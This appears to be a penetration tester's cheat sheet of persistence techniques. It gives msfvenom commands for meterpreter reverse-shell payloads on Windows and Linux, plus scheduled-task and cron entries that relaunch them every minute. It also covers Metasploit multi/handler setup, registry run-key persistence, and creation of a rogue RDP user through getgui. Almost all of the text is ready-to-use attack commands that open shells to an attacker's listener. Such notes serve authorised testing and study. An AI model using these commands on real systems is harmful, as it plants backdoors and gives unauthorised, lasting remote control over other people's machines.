The following are methods of persistence in order from more reliable to least reliable

NOTE: These examples use a meterpreter multi/handler. You can also generate other payloads (see msfvenom notes) and use other listeners, in case you want to use `nc`

#### Scheduled Task
Windows
```bash
# Create payload and transfer over
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<listen_ip> LPORT=<port> -f exe -o payload.exe 

# Create Scheduled Task
schtasks /create /tn <name> /tr C:\payload.exe /sc minute /mo 1 (/ru <user(SYSTEM)>)

# Verify
schtasks /query

# Catch with meterpreter listener
msfconsole
use exploit/multi/handler
set LHOST tun0
set LPORT <port>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Linux
```bash
# Create payload (msfvenom) and transfer over
msfvenom -p linux/meterpreter/reverse_tcp LHOST=<listen_ip> LPORT=<port> -f elf -o payload

# Create cronjob
chmod +x payload
crontab -e 
*/1 * * * * /path/to/<payload>

# Verify
crontab -l

# Catch with meterpreter listener
msfconsole
use exploit/multi/handler
set LHOST tun0
set LPORT <port>
set PAYLOAD linux/meterpreter/reverse_tcp
run
```

#### Registry Run Key
```bash
Meterpreter> run persistence –X –i <int> –r <ip> –p <port>
# Help: run persistence –h
# -X: Start on boot
# -i: Beacon interval (seconds)
# -r: Local IP 
# -p: Local port

Set up multi/handler
Requires reboot
Catch shell
```

#### Rogue User
```bash
Meterpreter> run getgui –e –u <username> –p <password>
# Help: run getgui -h
# -e: enable Remote Desktop on target system
# -u: username to be created
# -p: password that user will have

Authenticate via RDP
```